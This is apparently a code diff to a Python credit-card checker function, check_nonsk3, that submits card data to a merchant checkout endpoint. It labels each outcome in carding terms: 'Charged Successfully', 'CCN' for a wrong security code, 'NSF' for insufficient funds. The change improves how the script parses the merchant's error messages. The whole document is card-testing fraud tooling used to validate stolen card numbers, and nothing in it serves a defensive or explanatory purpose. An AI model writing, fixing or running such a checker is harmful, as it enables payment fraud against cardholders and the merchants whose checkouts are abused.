@@ -131,18 +131,22 @@ def check_nonsk3(cc_data):
     }
     confirm_order_response = session.post(checkout_confirm_url, headers=headers, data=checkout_confirm_data)
 
-    # Step 5: Parse response
+    # Step 6: Parse response
     status = get_str(confirm_order_response.text, '"result":"', '"')
+    msg = get_str(confirm_order_response.text, '\\"alert\\">\\n\\t\\t\\t<li>\\n\\t\\t\\t', '\\t\\t<\\/li>\\n\\t<\\/ul>')
+
     if status == "success":
         return "Charged Successfully 💳✅"
     elif status == "failure":
-        msg = get_str(confirm_order_response.text, '\\"alert\\">\\n\\t\\t\\t<li>\\n\\t\\t\\t', '\\t\\t<\\/li>\\n\\t<\\/ul>')
-        if "Your card's security code is incorrect" in msg:
-            return "CCN ❌"
-        elif "Your card has insufficient funds." in msg:
-            return "NSF ❌"
+        if msg:
+            if "Your card's security code is incorrect" in msg:
+                return "CCN ❌"
+            elif "Your card has insufficient funds." in msg:
+                return "NSF ❌"
+            else:
+                return f"Failed: {msg}"
         else:
-            return f"Failed: {msg}"
+            return "Failed: Unknown error"
     else:
         return "Unknown error ❌"
 
